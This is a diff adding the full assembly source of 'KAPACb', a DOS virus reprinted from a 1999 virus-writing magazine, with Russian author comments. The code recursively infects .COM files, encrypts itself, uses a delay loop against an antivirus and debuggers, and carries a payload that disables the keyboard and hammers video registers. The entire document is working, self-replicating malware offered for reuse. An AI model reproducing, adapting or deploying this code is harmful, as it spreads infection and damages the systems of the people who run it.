@@ -1,0 +1,365 @@
+┌──┬──┐          /╔════╗/╦══╗ /╔═══╗  ╔═══╗ /╔══╦══╗/╦   /╦/╦══╗ /╔═══╗ ╔═══╗
+   │┬  ┌──       │║   /╩│║ /╚╗│║  /  │║  │║ // │║ //│║   │║│║ /╚╗│║  /╩│║ │/╩
+   │├─┐│ ░░▒▒▒▓▓▓│║▓▓▓▓▓│║▓/╔╝│║▓▓▓▓▓╔╩═══╩╗▓▓▓│║▓▓▓│║▓▓▓│║│║▓/╔╝│║▓▓▓▓│║▓▒▒░
+   ││ │├─        │║     │╠══╣ │║═   │║    │║   │║   │║   │║│╠══╣ │║═   /╚═══╗
+   ││ ││         │║   /╦│║  ╚╗│║  /╦│║    │║   │║   │║   ╔╝│║  ╚╗│║  /╦ ╦  │║
+   │┴ ┘└─┘       /╚════╝/╩  /╩/╚═══╝/╩    /╩   /╩   /╚═══╝ /╩  /╩/╚═══╝/╚═══╝
+   │ THE CREATURES │ Computer Virus Magazine │ April 1999            issue 03
+   │───────────────┴─────────────────────────┴───────────────────────────────
+   │
+   │                     ИСХОДНИК ВИРУСА "KAPACb"
+
+══════════════════════════════════════════════════════════════════════════════
+
+
+; Ето мой первый вирь на асме
+; Называется KAPACb в честь нашего физкультурника
+; Карасева Ан**** Ал************ или Ан.Ал.'a
+; Так шо занимайтесь физкультурой, детишки :}
+; Заражает комки в данном дире, его поддирах и то же самое в корне
+; Шифрует себя, правда галимо. Если заразит win.com, то пу-пу настанет
+; Так шо на диске с виндузами лучше не тестировать.
+; Непонимание им форточек можно считать деструкцией,
+;                      + содержит трахалку монитора
+; Содержит антиXPEHистический элемент. Действует против дАНИЛОFF'a
+; На других антивирусах не пробовал.
+; В коде вируса допускаются любые изменения, но PLZ не ставьте своего копирайта
+; Ну вот и все, начинается вирус ...
+;                                 с уважением DEC0DER
+.model tiny
+.code
+id=0D0F1h   ; FIDO
+addon equ callp
+org 100h
+start:
+       db 0e9h,5,0
+       mov ax,4c00h ; victim
+       int 21h
+
+virs:
+       call callp
+
+callp:
+       pop bp
+       sub bp,offset callp      ; calculate bp
+
+       mov ax,15                ; This is antiXPEHistic
+       mov cx,0ffffh            ; Web fucks to do all this jumps
+ae:                             ;
+       db 10 dup (90h)          ;
+       dec cx                   ; Also it works again debuggers :)
+       cmp cx,0                 ;
+       jne ae                   ;
+       dec ax                   ;
+       cmp ax,0                 ;
+       jne ae                   ;
+
+       mov ah,byte ptr(bp+offset sdec)    ; get uncrypt key
+       sub ah,90h
+
+       mov si,eof                         ;our length
+       add si,bp
+nextb:
+       mov al,byte ptr (si+offset sdec)
+       sub al,ah
+       mov byte ptr (si+offset sdec),al   ; uncrypt
+
+       dec si
+
+       cmp si,bp
+       jne nextb
+
+       mov al,byte ptr (bp+offset sdec)
+       sub al,ah
+       mov byte ptr (bp+offset sdec),al   ; uncrypt
+
+       jmp godir
+
+sdec:
+       nop                      ; install file
+       pop dx
+       mov word ptr( bp+offset return),dx   ; save return
+
+       mov al,byte ptr (bp+offset old3)
+       mov [ds:100h],al
+       mov al,byte ptr (1+bp+offset old3)
+       mov [ds:101h],al
+       mov al,byte ptr (2+bp+offset old3) ; restore old 3 bytes
+       mov [ds:102h],al
+
+       mov ah,1ah               ;new DTA
+       lea dx,[newdta+bp]
+       int 21h
+
+       mov ah,4eh
+       lea dx,[bp+offset fmask]          ;finfirst
+       mov cx,20h    ; attribute archive
+       int 21h
+fnext:
+
+       jnc continue
+       jmp all
+continue:
+
+       mov ax,3d02h
+       lea dx,[30+bp+offset newdta]      ; open file for read/write
+       int 21h
+
+       push ax
+       xchg ax,bx
+
+       mov ah,3fh
+       mov cx,2
+       lea dx,[bp+offset testcom]        ; read first two bytes
+       int 21h
+
+       cmp word ptr(bp+offset testcom),5a4dh   ;is it really .com file?
+       jne cont1
+       jmp close
+
+cont1:
+       pop bx
+       push bx  ; get fhandle
+       mov ax,4200h
+       xor cx,cx
+       xor dx,dx
+       int 21h
+
+       pop bx
+       push bx  ; get fhandle
+       mov ax,4202h
+       xor cx,cx
+       xor dx,dx                        ; goto end of file
+       int 21h
+
+       mov [bp+offset flen],ax          ; save file length
+
+       pop bx
+       push bx  ; get fhandle
+       mov dx,[bp+offset flen]
+       sub dx,2
+       mov ax,4200h                     ; goto flen-2
+       xor cx,cx
+       int 21h
+
+       pop bx
+       push bx  ; get fhandle
+       mov ah,3fh
+       mov cx,2
+       lea dx,[bp+offset testid]       ; read ID
+       int 21h
+
+       cmp word ptr cs:[bp+testid],id
+       jne n1                         ; test id
+       jmp close
+n1:
+       mov dx,[bp+offset flen]
+       sub dx,3
+       mov [bp+offset wto],dx           ;calculate jump
+
+       pop bx
+       push bx  ; get fhandle
+       mov ax,4200h
+       xor cx,cx
+       xor dx,dx
+       int 21h                          ;go to begin of victim
+
+       pop bx
+       push bx  ; get fhandle
+       mov ah,3fh
+       mov cx,3
+       lea dx,[bp+offset old3]          ; save old 3 bytes
+       int 21h
+
+       pop bx
+       push bx  ; get fhandle
+       mov ax,4200h
+       xor cx,cx
+       xor dx,dx
+       int 21h                          ;go to begin of victim
+
+       pop bx
+       push bx  ; get fhandle
+       mov ah,40h
+       lea dx,[bp+offset jump]          ;write jump
+       mov cx,3
+       int 21h
+
+       pop bx
+       push bx  ; get fhandle
+       mov ax,4202h
+       xor cx,cx
+       xor dx,dx
+       int 21h                          ; go to end of victim
+
+       pop bx
+       push bx  ; get fhandle
+       mov ah,40h
+       lea dx,[bp+offset virs]
+       mov cx,uncryptp
+       int 21h                          ; write decrypt program
+
+       mov cx,EOF
+       lea si,[bp+offset sdec]
+       lea di,[bp+offset crypt]
+
+       rep movsb
+
+rerand:
+       xor ah,ah                 ; get random key
+       int 1ah
+       mov ah,cl
+       cmp cl,0
+       je rerand
+       cmp cl,0ffh
+       jne skip2
+       cmp cl,0feh               ; is it time to show us?
+       jne skip2
+       cmp cl,0fdh
+       jne skip2
+       jmp destr
+skip2:
+
+       mov si,eof
+       add si,bp
+
+ncr:
+       mov al,byte ptr(si+offset crypt)
+       add al,ah
+       mov byte ptr(si+offset crypt),al
+
+       dec si
+       cmp si,bp
+       jne ncr
+
+       mov al,byte ptr(bp+offset crypt)
+       add al,ah
+       mov byte ptr(bp+offset crypt),al
+
+       pop bx
+       push bx  ; get fhandle
+       mov ah,40h
+       lea dx,[bp+offset crypt]
+       mov cx,eof
+       int 21h                          ; write crypted virus body
+
+       pop bx
+       push bx  ; get fhandle
+       mov ah,40h
+       lea dx,[bp+offset myid]
+       mov cx,2
+       int 21h                          ; write ID
+
+
+close:
+       pop bx
+       push bx  ; get fhandle
+       mov ah,3eh
+       int 21h                          ; close victim
+
+       mov ah,4fh                       ; find next
+       int 21h
+
+       jmp fnext
+all:
+       mov dx,word ptr (bp+offset return)
+       push dx
+       retn
+godir:
+       lea dx,[bp+offset dirdta]       ; dir dta
+       mov ah,1ah
+       int 21h
+
+       lea dx,[bp+offset dirmask]      ; find first dir
+       mov cx,10h
+       mov ah,4eh
+       int 21h
+
+nextdir:
+       jc alldir
+
+       cmp byte ptr (bp+21+offset dirdta),10h
+       jne skip
+       cmp byte ptr (bp+30+offset dirdta),'.'    ; is it really dir?
+       je skip
+
+       mov ah,3bh
+       lea dx,[bp+30+offset dirdta]            ;yes? let's go there
+       int 21h
+
+       call sdec                               ; infect all here
+
+       mov ah,3bh
+       lea dx,[bp+offset prv]                  ; change dir back
+       int 21h
+
+       lea dx,[bp+offset dirdta]            ; dir dta
+       mov ah,1ah
+       int 21h
+
+skip:
+       mov ah,4fh                       ; find next dir
+       int 21h
+
+       jmp nextdir
+alldir:
+       call sdec
+
+       mov ah,byte ptr(bp+offset tdir)
+       cmp ah,0
+       jne alldone
+
+       mov ah,3bh
+       lea dx,[bp+offset k]
+       int 21h
+
+       mov ah,1
+       mov byte ptr(bp+offset tdir),ah
+
+       jmp godir
+alldone:
+       mov ah,1ah
+       mov dx,80h                       ; old dta
+       int 21h
+
+       xor di,di
+       push di
+       mov di,100h                      ; execute main program
+       push di
+
+       retn
+destr:
+       mov al,0adh
+       out 64h,al
+       mov dx,3d4h
+       mov al,8
+       out dx,al
+       inc dx
+XPEHb:
+       inc al
+       out dx,al
+       jmp XPEHb
+
+
+tdir   db 0
+old3   db 3 dup (90h)
+fmask  db '*.com',0
+dirmask db '*.*',0
+k      db '\',0
+prv    db '..',0
+       db 'Ну шо, антивирусник, докопался?',13     ; Espesially for ...
+       db ' Virus KAPACb, (c) DEC0DER 1999'
+uncryptp equ sdec-virs
+jump   db 0e9h
+wto    dw ?
+myid   dw id
+EOF    equ $-sdec
+testcom dw ?
+flen   dw ?
+return dw ?
+testid dw ?
+
+newdta db 80h dup (?)
+dirdta db 80h dup (?)
+crypt  db EOF dup (?)
+end start
